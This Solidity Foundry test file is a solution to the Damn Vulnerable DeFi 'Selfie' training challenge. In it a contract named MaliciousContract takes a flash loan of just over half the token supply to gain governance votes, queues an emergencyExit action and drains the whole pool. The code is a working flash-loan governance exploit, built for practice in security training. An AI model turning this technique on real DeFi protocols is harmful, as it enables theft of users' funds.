// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import "forge-std/Test.sol";
import {SelfiePool} from "../src/damn-vulnerable-defi/contracts/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../src/damn-vulnerable-defi/contracts/selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../src/damn-vulnerable-defi/contracts/DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

//interface IERC3156FlashBorrower {
//    /**
//     * @dev Receive a flash loan.
//     * @param initiator The initiator of the loan.
//     * @param token The loan currency.
//     * @param amount The amount of tokens lent.
//     * @param fee The additional amount of tokens to repay.
//     * @param data Arbitrary data structure, intended to contain user-defined parameters.
//     * @return The keccak256 hash of "IERC3156FlashBorrower.onFlashLoan"
//     */
//    function onFlashLoan(
//        address initiator,
//        address token,
//        uint256 amount,
//        uint256 fee,
//        bytes calldata data
//    ) external returns (bytes32);
//}

contract MaliciousContract is Test, IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot dvts;

    uint256 totalSupply = 1_500_000;
    bytes32 constant FLASH_BORROWER_OK = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address alice = vm.addr(0xa11Ce);
    uint256 currentAction;

    function setUp() public {
        /// @audit Take a flashloan and queue action
        /// @audit Action should include address of pool and the selector of the emergency withdraw.
        /// @audit Wait for two days and execute action.

        vm.startPrank(alice);

        dvts = new DamnValuableTokenSnapshot(totalSupply);
        governance = new SimpleGovernance(address(dvts));
        pool = new SelfiePool(address(dvts), address(governance));

        uint256 index = dvts.snapshot();

        dvts.transfer(address(pool), dvts.balanceOf(alice));
        vm.stopPrank();
    }

    function testSetUp() public {
        assertEq(dvts.balanceOf(alice), 0);
        assertEq(dvts.balanceOf(address(pool)), totalSupply);

        assertEq(dvts.balanceOf(address(this)), 0);

        vm.expectRevert();
        pool.emergencyExit(address(this));
    }

    function testHack() public {
        console.log("DVTS Total Supply::", dvts.totalSupply());
        console.log("1/2 DVTS Total Supply::", dvts.totalSupply() / 2);
        /// Rule states total locked is 1.5M.

        uint256 _amount = (dvts.totalSupply() / 2) + 1;
        console.log("Taking a flashLoan of", _amount);

        dvts.approve(address(pool), _amount);

        pool.flashLoan(this, address(dvts), _amount, "");

        console.log("Flashloan paid");
        assertEq(dvts.balanceOf(address(this)), 0);
        console.log("Contract Balance:", dvts.balanceOf(address(this)));

        skip(2 days);

        governance.executeAction(currentAction);

        assertEq(dvts.balanceOf(address(this)), totalSupply);
        console.log("Contract Balance:", dvts.balanceOf(address(this)));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) public returns (bytes32) {
        /// Queue target.
        bytes memory _data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            address(this)
        );

        uint256 index = dvts.snapshot();

        currentAction = governance.queueAction(address(pool), 0, _data);

        initiator;
        token;
        amount;
        fee;
        data;

        console.log("Event Queued!");

        return (FLASH_BORROWER_OK);
    }
}